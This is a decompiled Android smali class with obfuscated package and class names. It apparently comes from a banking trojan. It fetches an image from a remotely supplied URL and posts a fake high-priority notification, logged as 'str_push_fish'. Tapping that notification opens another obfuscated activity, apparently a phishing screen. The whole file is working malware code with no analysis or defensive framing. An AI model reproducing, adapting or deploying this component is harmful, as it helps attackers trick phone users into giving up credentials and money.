.class public Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;
.super Landroid/os/AsyncTask;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = "a"
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask<",
        "Ljava/lang/String;",
        "Ljava/lang/Void;",
        "Landroid/graphics/Bitmap;",
        ">;"
    }
.end annotation


# instance fields
.field final synthetic a:Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw;

.field private b:Landroid/content/Context;

.field private c:Ljava/lang/String;

.field private d:Ljava/lang/String;

.field private e:Ljava/lang/String;

.field private f:Ljava/lang/String;


# direct methods
.method public constructor <init>(Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw;Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->a:Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw;

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    iput-object p2, p0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->b:Landroid/content/Context;

    iput-object p3, p0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->c:Ljava/lang/String;

    iput-object p4, p0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->d:Ljava/lang/String;

    iput-object p5, p0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->e:Ljava/lang/String;

    iput-object p6, p0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->f:Ljava/lang/String;

    iget-object p1, p1, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string p2, "PUSH"

    const-string p3, "2"

    invoke-virtual {p1, p2, p3}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method


# virtual methods
.method protected varargs a([Ljava/lang/String;)Landroid/graphics/Bitmap;
    .locals 2

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->a:Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw;

    iget-object p1, p1, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "PUSH"

    const-string v1, "3"

    invoke-virtual {p1, v0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    const/4 p1, 0x0

    :try_start_0
    new-instance v0, Ljava/net/URL;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->e:Ljava/lang/String;

    invoke-direct {v0, v1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v0

    check-cast v0, Ljava/net/HttpURLConnection;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setDoInput(Z)V

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->connect()V

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v0

    invoke-static {v0}, Landroid/graphics/BitmapFactory;->decodeStream(Ljava/io/InputStream;)Landroid/graphics/Bitmap;

    move-result-object v0
    :try_end_0
    .catch Ljava/net/MalformedURLException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    return-object v0

    :catch_0
    return-object p1
.end method

.method protected a(Landroid/graphics/Bitmap;)V
    .locals 5
    .annotation build Landroid/annotation/TargetApi;
        value = 0x10
    .end annotation

    invoke-super {p0, p1}, Landroid/os/AsyncTask;->onPostExecute(Ljava/lang/Object;)V

    :try_start_0
    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->a:Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw;

    iget-object v0, v0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->b:Landroid/content/Context;

    const-string v2, "str_push_fish"

    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->f:Ljava/lang/String;

    invoke-virtual {v0, v1, v2, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->a:Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw;

    iget-object v0, v0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v1, "PUSH"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "4 "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->f:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->a:Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw;

    const-class v2, Lwocwvy/czyxoxmbauu/slsa/ncec/ozkgyjpxtyxajmm;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "str"

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->f:Ljava/lang/String;

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v0

    const/high16 v1, 0x800000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v0

    const/high16 v1, 0x40000000    # 2.0f

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v0

    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x19

    if-gt v2, v3, :cond_0

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->b:Landroid/content/Context;

    const/16 v3, 0x64

    invoke-static {v2, v3, v0, v1}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->b:Landroid/content/Context;

    const-string v2, "notification"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/NotificationManager;

    new-instance v2, Landroid/app/Notification$Builder;

    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->b:Landroid/content/Context;

    invoke-direct {v2, v3}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;)V

    invoke-virtual {v2, v0}, Landroid/app/Notification$Builder;->setContentIntent(Landroid/app/PendingIntent;)Landroid/app/Notification$Builder;

    move-result-object v0

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->c:Ljava/lang/String;

    invoke-virtual {v0, v2}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v0

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->d:Ljava/lang/String;

    invoke-virtual {v0, v2}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v0

    const/4 v2, 0x5

    new-array v2, v2, [J

    fill-array-data v2, :array_0

    invoke-virtual {v0, v2}, Landroid/app/Notification$Builder;->setVibrate([J)Landroid/app/Notification$Builder;

    move-result-object v0

    const/4 v2, 0x1

    invoke-virtual {v0, v2}, Landroid/app/Notification$Builder;->setPriority(I)Landroid/app/Notification$Builder;

    move-result-object v0

    const/4 v3, 0x2

    invoke-virtual {v0, v3}, Landroid/app/Notification$Builder;->setDefaults(I)Landroid/app/Notification$Builder;

    move-result-object v0

    invoke-virtual {v0, v2}, Landroid/app/Notification$Builder;->setDefaults(I)Landroid/app/Notification$Builder;

    move-result-object v0

    const/4 v3, 0x4

    invoke-virtual {v0, v3}, Landroid/app/Notification$Builder;->setDefaults(I)Landroid/app/Notification$Builder;

    move-result-object v0

    const/high16 v3, 0x7f020000

    invoke-virtual {v0, v3}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    move-result-object v0

    invoke-virtual {v0, p1}, Landroid/app/Notification$Builder;->setLargeIcon(Landroid/graphics/Bitmap;)Landroid/app/Notification$Builder;

    move-result-object p1

    invoke-virtual {p1}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object p1

    iget v0, p1, Landroid/app/Notification;->flags:I

    or-int/lit8 v0, v0, 0x10

    iput v0, p1, Landroid/app/Notification;->flags:I

    invoke-virtual {v1, v2, p1}, Landroid/app/NotificationManager;->notify(ILandroid/app/Notification;)V

    return-void

    :cond_0
    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->a:Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v2, "Notification"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Title: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->c:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, " Text: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->d:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->a:Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw;

    iget-object v1, v1, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->b:Landroid/content/Context;

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->c:Ljava/lang/String;

    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->d:Ljava/lang/String;

    invoke-static {v1, v0, p1, v2, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/content/Context;Landroid/content/Intent;Landroid/graphics/Bitmap;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->a:Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw;

    iget-object p1, p1, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "ERROR"

    const-string v1, "nepgaqmyfrhw -> PUSH 4"

    invoke-virtual {p1, v0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    return-void

    nop

    :array_0
    .array-data 8
        0x3e8
        0x3e8
        0x3e8
        0x3e8
        0x3e8
    .end array-data
.end method

.method protected synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 0

    check-cast p1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->a([Ljava/lang/String;)Landroid/graphics/Bitmap;

    move-result-object p1

    return-object p1
.end method

.method protected synthetic onPostExecute(Ljava/lang/Object;)V
    .locals 0
    .annotation build Landroid/annotation/TargetApi;
        value = 0x10
    .end annotation

    check-cast p1, Landroid/graphics/Bitmap;

    invoke-virtual {p0, p1}, Lwocwvy/czyxoxmbauu/slsa/nepgaqmyfrhw$a;->a(Landroid/graphics/Bitmap;)V

    return-void
.end method
